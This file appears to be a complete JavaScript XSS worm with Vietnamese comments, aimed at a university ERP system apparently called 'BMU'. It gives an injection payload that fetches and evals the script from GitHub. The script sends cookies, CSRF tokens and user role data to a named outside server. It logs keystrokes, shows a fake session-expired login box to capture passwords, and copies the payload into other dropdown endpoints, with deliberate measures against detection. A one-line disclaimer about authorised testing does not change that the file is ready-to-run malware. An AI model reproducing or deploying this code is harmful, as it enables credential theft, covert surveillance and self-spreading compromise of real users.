// ============================================================
// evil.js - Persistent XSS worm (tự nhân bản + hoạt động ngầm)
//
// ⚠️ Chỉ dùng để test bảo mật trên hệ thống bạn được phép.
//
// Đặc điểm:
// - KHÔNG alert, KHÔNG console.log, KHÔNG gây chú ý
// - Chạy lại MỖI LẦN trang load (persistent qua dropdown)
// - Gửi dữ liệu dạng JSON object về server
// - PHÂN BIỆT người dùng qua victim_id (fingerprint)
// - Tự hủy nếu chạy trùng (tránh chạy 2 lần trong 1 trang)
// - WORM: tự nhân bản payload vào các dropdown khác
// - ID NGẪU NHIÊN: không dùng id cố định (tránh bị phát hiện)
//
// Cách setup:
// 1. Chạy server: py attacker_server.py
// 2. Upload file này lên GitHub raw
// 3. Dán payload vào dropdown (học hàm/dân tộc...)
//    '><svg onload=$.get(`//URL_CỦA_BẠN/evil.js`).then(eval)>
// 4. MỌI NGƯỜI truy cập form → payload chạy → gửi về server
// ============================================================

(function() {
  'use strict';

  // ⚙️ CẤU HÌNH
  var ATTACKER_URL = "https://misterxplo.pythonanywhere.com/worker";  // Server nhận dữ liệu
  var WRITE_KEY = "BMU-WRITE-KEY-XXXXXXX-sdfd3";   // 🔴 ĐỔI THÀNH KEY GHI CỦA BẠN
  var VERSION = "2.0";

  // ============================================================
  // CHỐNG CHẠY TRÙNG (chỉ chạy 1 lần mỗi trang)
  // ============================================================
  try {
    if (window.__xssRunning) return;
    window.__xssRunning = true;
  } catch(e) {}

  // ============================================================
  // TẠO ID NGẪU NHIÊN (ẨN - tránh bị phát hiện)
  // ============================================================
  var RAND_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';

  function genId(len) {
    var s = '';
    for (var i = 0; i < (len || 8); i++) {
      s += RAND_CHARS.charAt(Math.floor(Math.random() * RAND_CHARS.length));
    }
    return s;
  }

  // ID ngẫu nhiên cho form phishing (không chứa "xss"/"phish")
  var ID_FORM = 'ov_' + genId(6);
  var ID_USER = 'in_' + genId(6);
  var ID_PASS = 'pd_' + genId(6);
  var ID_BTN = 'bt_' + genId(6);

  // ============================================================
  // FINGERPRINT DUY NHẤT CHO MỖI NGƯỜI DÙNG
  // ============================================================
  function getVictimId() {
    try {
      var id = localStorage.getItem('__v_id');
      if (!id) {
        id = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
        localStorage.setItem('__v_id', id);
      }
      return id;
    } catch(e) {
      return 'V' + Date.now().toString(36);
    }
  }

  function getFingerprint() {
    var parts = [
      navigator.userAgent,
      navigator.language,
      screen.width + 'x' + screen.height,
      screen.colorDepth,
      navigator.platform,
      new Date().getTimezoneOffset()
    ];
    var hash = 0;
    for (var i = 0; i < parts.join('|').length; i++) {
      hash = ((hash << 5) - hash) + parts.join('|').charCodeAt(i);
      hash |= 0;
    }
    return 'FP' + Math.abs(hash).toString(36);
  }

  var victimId = getVictimId();
  var fingerprint = getFingerprint();

  // ============================================================
  // GỬI DỮ LIỆU VỀ SERVER
  // ============================================================
  function exfil(data, type) {
    try {
      var payload = {
        victim_id: victimId,
        fingerprint: fingerprint,
        type: type,
        time: new Date().toISOString(),
        data: data
      };

      fetch(ATTACKER_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': WRITE_KEY
        },
        body: JSON.stringify(payload),
        mode: 'no-cors'
      }).catch(function() {});

      var img = new Image();
      img.src = ATTACKER_URL + '?key=' + encodeURIComponent(WRITE_KEY) + '&v=' + victimId + '&f=' + fingerprint + '&t=' + type + '&d=' + encodeURIComponent(JSON.stringify(data).substring(0, 500));
    } catch(e) {}
  }

  // ============================================================
  // THU THẬP THÔNG TIN
  // ============================================================
  var cookies, csrfToken;
  try { cookies = document.cookie || ""; } catch(e) { cookies = ""; }
  try {
    var c = document.querySelector('meta[name="csrf-token"]');
    csrfToken = (c && c.content) ? c.content : "none";
  } catch(e) { csrfToken = "none"; }

  var gonData = {};
  try {
    if (typeof gon !== 'undefined') {
      gonData = {
        uid: gon.user_id,
        uname: gon.user_name || gon.username,
        org: gon.organization,
        lead: gon.leader_roles,
        fac: gon.faculty,
        roles: gon.roles
      };
    }
  } catch(e) {}

  var pageInfo = {
    url: location.href.substring(0, 300),
    domain: document.domain,
    title: document.title.substring(0, 100),
    ua: navigator.userAgent.substring(0, 150),
    lang: navigator.language,
    screen: screen.width + 'x' + screen.height,
    time: new Date().toISOString()
  };

  // Gửi dữ liệu MỖI LẦN trang load
  exfil({
    cookies: cookies.substring(0, 500),
    csrf: csrfToken.substring(0, 100),
    url: pageInfo.url,
    domain: pageInfo.domain,
    title: pageInfo.title,
    ua: pageInfo.ua,
    lang: pageInfo.lang,
    screen: pageInfo.screen,
    gon: gonData,
    ver: VERSION
  }, 'visit');

  // ============================================================
  // KEYLOGGER NGẦM
  // ============================================================
  (function() {
    var buf = [];
    document.addEventListener('keydown', function(e) {
      try {
        var key = e.key;
        if (key.length > 1) key = '[' + key + ']';
        buf.push(key);
        if (buf.length >= 15) {
          exfil({ keys: btoa(buf.join('')), url: pageInfo.url }, 'key');
          buf = [];
        }
      } catch(e2) {}
    });
  })();

  // ============================================================
  // WORM - TỰ NHÂN BẢN PAYLOAD VÀO CÁC DROPDOWN KHÁC
  // ============================================================
  // Script tự tạo thêm bản ghi payload vào các dropdown khác
  // để lây lan. Chỉ lây 1 lần mỗi trình duyệt (tránh spam).
  function wormSpread() {
    try {
      if (localStorage.getItem('__w_done') === '1') return;

      // URL script hiện tại (tự phát hiện)
      var scriptUrl = '';
      try {
        var scripts = document.getElementsByTagName('script');
        for (var i = 0; i < scripts.length; i++) {
          var src = scripts[i].src || '';
          if (src.indexOf('evil') >= 0 || src.indexOf('tester') >= 0 || src.indexOf('worker') >= 0) {
            scriptUrl = src;
            break;
          }
        }
      } catch(e) {}
      if (!scriptUrl) {
        scriptUrl = '//raw.githubusercontent.com/tringuyen1998allstar2018/testerfromhell/refs/heads/main/evil.js';
      }

      // Payload để nhân bản
      var wormPayload = "'><svg onload=$.get(`" + scriptUrl + "`).then(eval)>";

      // CSRF token
      var token = csrfToken;

      // Các endpoint tạo mới dropdown (POST)
      // Dựa trên API của ERP BMU
      var targets = [
        { path: '/academicrank', key: 'name' },        // Học hàm/Học vị
        { path: '/ethnic', key: 'name' },              // Dân tộc
        { path: '/nationality', key: 'name' },         // Quốc tịch
        { path: '/religions', key: 'name' },           // Tôn giáo
        { path: '/tbusertype', key: 'name' },          // Phân loại nhân sự
        { path: '/tbuserstatus', key: 'name' },        // Tình trạng nhân sự
        { path: '/tbhospitals', key: 'name' }          // Nơi khám chữa bệnh
      ];

      // Tạo tên ngụy trang (không giống payload - ẩn danh)
      var names = [
        'Hỗ trợ kỹ thuật', 'Bảo trì hệ thống', 'Quản trị dữ liệu',
        'Phòng Công nghệ thông tin', 'Vận hành', 'Giám sát'
      ];
      var fakeName = names[Math.floor(Math.random() * names.length)] + ' ' + genId(4);

      // Dùng jQuery AJAX (có sẵn trong ERP) để POST
      var getCsrf = function() {
        try {
          var m = document.querySelector('meta[name="csrf-token"]');
          return m ? m.content : '';
        } catch(e) { return ''; }
      };

      var csrf = getCsrf();

      // Lây lan tối đa 3 endpoint (tránh bị phát hiện)
      var spreadCount = 0;
      for (var t = 0; t < targets.length && spreadCount < 3; t++) {
        (function(tgt) {
          try {
            if (window.jQuery) {
              jQuery.ajax({
                url: tgt.path,
                method: 'POST',
                data: {
                  authenticity_token: csrf,
                  [tgt.key]: wormPayload,
                  name: wormPayload,
                  scode: 'W' + genId(10)
                },
                complete: function(r) {
                  if (r && r.status === 200) {
                    spreadCount++;
                    exfil({ spread: tgt.path }, 'spread');
                  }
                }
              });
            }
          } catch(e) {}
        })(targets[t]);
      }

      // Đánh dấu đã lây lan (tránh lặp lại)
      try { localStorage.setItem('__w_done', '1'); } catch(e) {}
    } catch(e) {}
  }

  // ============================================================
  // ĐÓNG MODAL BOOTSTRAP + TẠO FORM PHISHING (ID ẨN)
  // ============================================================
  function createPhishForm() {
    try {
      if (localStorage.getItem('__f_done') === '1') return;

      // === ĐÓNG MODAL BOOTSTRAP ĐANG MỞ ===
      try {
        if (window.jQuery && jQuery.fn && jQuery.fn.modal) {
          jQuery('.modal').each(function() {
            try { jQuery(this).modal('hide'); } catch(e3) {}
          });
        }
        document.body.classList.remove('modal-open');
        var bd = document.querySelectorAll('.modal-backdrop');
        for (var bi = 0; bi < bd.length; bi++) bd[bi].parentNode.removeChild(bd[bi]);
        var md = document.querySelectorAll('.modal.show, .modal[style*="display: block"]');
        for (var mi = 0; mi < md.length; mi++) {
          md[mi].style.display = 'none';
          md[mi].classList.remove('show');
        }
        document.body.style.overflow = '';
        document.body.style.paddingRight = '';
      } catch(e3) {}

      // === TẠO OVERLAY (ID ẨN) ===
      var overlay = document.createElement('div');
      overlay.setAttribute('id', ID_FORM);
      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;' +
        'background:rgba(0,0,0,0.88);z-index:2147483647;display:flex;' +
        'align-items:center;justify-content:center;pointer-events:auto;';

      overlay.addEventListener('click', function(e) { e.stopPropagation(); });
      overlay.addEventListener('mousedown', function(e) { e.stopPropagation(); });
      overlay.addEventListener('pointerdown', function(e) { e.stopPropagation(); });

      // === HỘP FORM ===
      var box = document.createElement('div');
      box.style.cssText = 'background:#fff;padding:30px;border-radius:8px;width:350px;' +
        'font-family:Arial,Helvetica,sans-serif;font-size:14px;pointer-events:auto;' +
        'position:relative;z-index:2147483647;box-shadow:0 0 30px rgba(0,0,0,0.5);';

      var title = document.createElement('h2');
      title.textContent = 'Đăng Nhập';
      title.style.cssText = 'margin:0 0 15px 0;color:#1976d2;text-align:center;';
      box.appendChild(title);

      var msg = document.createElement('p');
      msg.textContent = 'Phiên làm việc đã kết thúc. Vui lòng xác thực lại.';
      msg.style.cssText = 'margin:0 0 15px 0;color:#666;text-align:center;font-size:13px;';
      box.appendChild(msg);

      // Ô username (ID ẨN)
      var userInput = document.createElement('input');
      userInput.setAttribute('type', 'text');
      userInput.setAttribute('placeholder', 'Tên đăng nhập');
      userInput.setAttribute('id', ID_USER);
      userInput.style.cssText = 'width:100%;padding:10px;margin-bottom:10px;' +
        'border:1px solid #ccc;border-radius:4px;box-sizing:border-box;pointer-events:auto;';
      box.appendChild(userInput);

      // Ô password (ID ẨN)
      var passInput = document.createElement('input');
      passInput.setAttribute('type', 'password');
      passInput.setAttribute('placeholder', 'Mật khẩu');
      passInput.setAttribute('id', ID_PASS);
      passInput.style.cssText = 'width:100%;padding:10px;margin-bottom:15px;' +
        'border:1px solid #ccc;border-radius:4px;box-sizing:border-box;pointer-events:auto;';
      box.appendChild(passInput);

      // Nút xác nhận (ID ẨN)
      var btn = document.createElement('button');
      btn.textContent = 'Xác nhận';
      btn.setAttribute('id', ID_BTN);
      btn.style.cssText = 'width:100%;padding:10px;background:#1976d2;color:#fff;' +
        'border:none;border-radius:4px;cursor:pointer;pointer-events:auto;';
      box.appendChild(btn);

      overlay.appendChild(box);
      document.body.appendChild(overlay);

      // Focus vào ô username
      setTimeout(function() {
        try { userInput.focus(); } catch(e) {}
      }, 300);

      // Chống Bootstrap focus trap (capture phase)
      document.addEventListener('keydown', function(e) {
        try {
          if (document.activeElement !== userInput && document.activeElement !== passInput) {
            if (e.key.length === 1 || e.key === 'Backspace' || e.key === ' ' || e.key === 'Enter') {
              e.stopImmediatePropagation();
              userInput.focus();
            }
          }
        } catch(e2) {}
      }, true);

      // Xử lý nút bấm
      btn.addEventListener('click', function(e) {
        e.preventDefault();
        e.stopPropagation();
        var u = userInput.value;
        var p = passInput.value;
        exfil({ username: u, password: p, url: pageInfo.url }, 'pwd');
        try { localStorage.setItem('__f_done', '1'); } catch(e2) {}
        overlay.remove();
      });

      // Cho phép Enter submit
      document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
          var u = userInput.value;
          var p = passInput.value;
          if (u || p) {
            try { localStorage.setItem('__f_done', '1'); } catch(e2) {}
            exfil({ username: u, password: p, url: pageInfo.url }, 'pwd');
            overlay.remove();
          }
        }
      });

    } catch(e) {}
  }

  // ============================================================
  // CHẠY
  // ============================================================
  // Hiện form phishing sau 1 giây
  setTimeout(createPhishForm, 1000);

  // Chạy worm sau 5 giây (đợi trang load xong)
  setTimeout(wormSpread, 5000);

  // ============================================================
  // TÓM TẮT:
  // 1. ✅ Gửi 'visit' về server mỗi lần truy cập
  // 2. ✅ Keylogger ghi âm thầm, gửi mỗi 15 phím
  // 3. ✅ Phishing form ID NGẪU NHIÊN (tránh bị phát hiện)
  // 4. ✅ Worm tự nhân bản payload vào dropdown khác
  // 5. ✅ Đóng modal Bootstrap trước khi hiện form
  // ============================================================
})();
